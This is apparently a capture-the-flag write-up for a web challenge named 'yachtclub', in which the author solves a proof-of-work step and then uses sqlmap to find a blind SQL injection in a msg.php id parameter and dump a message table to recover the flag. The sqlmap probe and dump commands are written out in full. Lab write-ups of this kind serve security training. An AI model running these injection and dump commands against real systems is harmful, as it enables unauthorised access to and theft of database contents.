The idea for yachtclub was to first observe what the `pow` function was doing:

```
function pow(num_a, match) {
  for (let i = 0; i < 1e5; i++) {
    const hash = await sha256(num_a * i);
    if (hash === match) {
      return i.toString();
    }
  }

  return null;
}
```

First you had to provide a number as a proof of work being given 2 fields
in the html source `data-num-a` and `data-hash`. In order to get the number
I created a python script that can be used like:

```
python3 exploit.py <num> <hash>
```

After fetching the right number the page changes with a "Request pending".
This pointed to a route of interests:

```
http://<url>/msg.php?id=<number>
```

The next step was to check with sqlmap that query parameter:

```
sqlmap -u "http://<ip>:<port>/msg.php?id=1337" -p id
```

This seemed to be injectable using a blind sql injection. The final payload was:

```
sqlmap "http://<ip>:<port>/msg.php?id=1337" -p id --dump -D unr21s2-individual-yachtclub -T message
```

The flag was:

```
UNR{65lpfq-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```
